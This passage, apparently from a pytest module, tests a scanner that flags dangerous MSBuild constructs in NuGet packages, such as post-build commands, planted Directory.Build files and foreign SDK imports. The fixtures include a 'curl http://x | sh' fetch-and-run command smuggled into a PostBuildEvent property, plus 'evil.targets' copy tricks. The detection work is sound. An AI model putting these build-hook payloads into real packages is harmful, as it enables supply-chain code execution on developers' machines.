        '<MSBuild Projects="$(MSBuildProjectFullPath)" '
        f'Targets="PostBuildEvent" {attr}="A=1;PostBuildEvent=curl http://x | sh" /></Target>'
    )
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001", "BKT-NUGET-BUILD-002"]


def test_property_set_by_create_property_is_judged(make_nupkg):
    body = (
        '<Target Name="X"><CreateProperty Value="echo hi">'
        '<Output TaskParameter="Value" PropertyName="PostBuildEvent" /></CreateProperty></Target>'
    )
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


@pytest.mark.parametrize(
    "output",
    [
        'PropertyName="PostBuildEvent"',
        'PropertyName="CscToolExe"',
        'PropertyName="CustomAfterMicrosoftCommonTargets"',
        'ItemName="Analyzer"',
    ],
)
def test_property_or_item_a_task_output_sets_is_a_gap(make_nupkg, output):
    body = (
        '<Target Name="X"><ReadLinesFromFile File="$(MSBuildThisFileDirectory)x.txt">'
        f'<Output TaskParameter="Lines" {output} /></ReadLinesFromFile></Target>'
    )
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-SKIP-003"]


@pytest.mark.parametrize(
    "body",
    [
        "<ItemDefinitionGroup><PostBuildEvent><Command>echo hi</Command></PostBuildEvent>"
        "</ItemDefinitionGroup>",
        "<ItemDefinitionGroup><PreLinkEvent><Command>echo hi</Command></PreLinkEvent>"
        "</ItemDefinitionGroup>",
        '<ItemGroup><CustomBuild Include="x"><Command>echo hi</Command><Outputs>y</Outputs>'
        "</CustomBuild></ItemGroup>",
    ],
)
def test_cpp_build_commands_are_commands(make_nupkg, body):
    findings = scan_artifact(make_nupkg({"build/native/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


@pytest.mark.parametrize(
    ("body", "rules"),
    [
        ('<Import Project="Sdk.props" Sdk="Evil.Sdk" Version="1.0.0" />', ["BKT-SKIP-003"]),
        ('<Sdk Name="Evil.Sdk" Version="1.0.0" />', ["BKT-SKIP-003"]),
        ('<Import Project="Sdk.props" Sdk="Microsoft.NET.Sdk.Web" />', []),
    ],
)
def test_sdk_from_another_package_is_a_gap(make_nupkg, body, rules):
    assert _rules(scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))) == rules


def test_project_naming_an_sdk_from_another_package_is_a_gap(make_nupkg):
    data = '<Project Sdk="Evil.Sdk/1.0.0"></Project>'
    assert _rules(scan_artifact(make_nupkg({"build/Pkg.targets": data}))) == ["BKT-SKIP-003"]


@pytest.mark.parametrize(
    "task",
    [
        '<WriteLinesToFile File="$(MSBuildProjectDirectory)/Directory.Build.targets" '
        'Lines="&lt;Project /&gt;" />',
        '<WriteLinesToFile File="$(F)" Lines="x" />'
        "<PropertyGroup><F>$(MSBuildProjectDirectory)/global.json</F></PropertyGroup>",
        '<Copy SourceFiles="$(MSBuildThisFileDirectory)x.txt" '
        'DestinationFiles="$(SolutionDir)Directory.Build.props" />',
        '<Move SourceFiles="$(MSBuildThisFileDirectory)evil.targets" '
        'DestinationFolder="$(SolutionDir)" />',
        '<WriteLinesToFile File="obj/x.txt" Lines="&lt;Project&gt;&lt;/Project&gt;" />',
    ],
)
def test_writing_a_file_a_later_build_runs_is_a_command(make_nupkg, task):
    body = f'<Target Name="T">{task}</Target>'
    findings = scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)}))
    assert _rules(findings) == ["BKT-NUGET-BUILD-001"]


def test_writing_an_ordinary_file_is_not_flagged(make_nupkg):
    body = (
        '<Target Name="T"><WriteLinesToFile File="$(IntermediateOutputPath)v.txt" Lines="1.0" />'
        '<Copy SourceFiles="@(Native)" DestinationFolder="$(OutDir)" /></Target>'
    )
    assert scan_artifact(make_nupkg({"build/Pkg.targets": _targets(body)})) == []


def test_copy_of_a_file_named_by_an_item_is_judged(make_nupkg):
    body = (
        '<ItemGroup><E Include="$(MSBuildThisFileDirectory)evil.targets" /></ItemGroup>'
        '<Target Name="T"><Copy SourceFiles="@(E)" DestinationFolder="$(SolutionDir)" /></Target>'
    )
    files = {"build/Pkg.targets": _targets(body), "build/evil.targets": _targets("")}
    assert _rules(scan_artifact(make_nupkg(files))) == ["BKT-NUGET-BUILD-001"]


def test_root_sdk_attribute_in_another_case_is_read(make_nupkg):
    data = '<Project sdk="Evil.Sdk/1.0.0"></Project>'
    assert _rules(scan_artifact(make_nupkg({"build/Pkg.targets": data}))) == ["BKT-SKIP-003"]
